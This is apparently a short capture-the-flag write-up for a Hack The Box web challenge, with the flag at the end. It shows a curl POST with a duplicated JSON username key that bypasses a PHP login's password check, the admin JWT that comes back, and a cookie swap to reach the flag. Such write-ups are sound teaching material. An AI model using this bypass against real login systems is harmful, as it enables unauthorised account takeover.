'''
Ask chatgpt:
$query = $db->table("users")->getWhere($json_data, 1, 0);
if $json_data is {"username":"user1","password":"123"}, then $query should be SELECT * FROM users WHERE username = 'user1' AND password = '123' LIMIT 1 OFFSET 0;
And $json_data is controlled by us, so just change it to two username == administrator...

curl -X POST -d '{"username":"administrator","username":"administrator"}' http://94.237.63.83:39303/index.php/login
{"message":"Login Succesful","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MTA4MTA4NTcsImV4cCI6MTcxMDg0Njg1NywidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIn0.OBGyOm5cTmGef9cKiQ_fFluwarZehW2riH1IUCU_rl0"}

Register a normal user and login, then change the cookie to the token above, refresh and got the token:
HTB{I_just_want_to_sleep_a_little_bit!!!!!}
'''
